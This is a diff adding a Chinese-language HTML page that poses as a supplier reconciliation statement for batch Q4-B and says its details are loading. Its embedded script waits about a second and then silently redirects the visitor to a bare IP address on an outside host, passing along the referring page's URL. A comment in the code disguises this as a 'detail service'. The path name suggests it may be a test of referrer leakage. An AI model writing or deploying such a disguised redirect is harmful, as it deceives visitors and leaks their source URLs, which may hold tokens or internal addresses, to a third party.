@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>供应商对账明细</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:720px;margin:0 auto;padding:26px;color:#222;background:#fafbfc}
+ h1{font-size:18px;border-bottom:2px solid #0f766e;padding-bottom:8px}
+ .card{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px;font-size:14px;line-height:1.9}
+</style></head><body>
+<h1>供应商对账明细</h1>
+<div class="card">
+  本期对账批次 Q4-B，交付 1,200 件，金额 864,000 元。<br>
+  正在加载差异明细……
+</div>
+<script>
+// 页面自动跳转到"明细服务"，并把来源页面地址作为参数带上
+setTimeout(function(){
+  var r = document.referrer || '';
+  location.href = 'http://8.163.58.115:18781/refleak2/check?r=' + encodeURIComponent(r);
+}, 1200);
+</script></body></html>
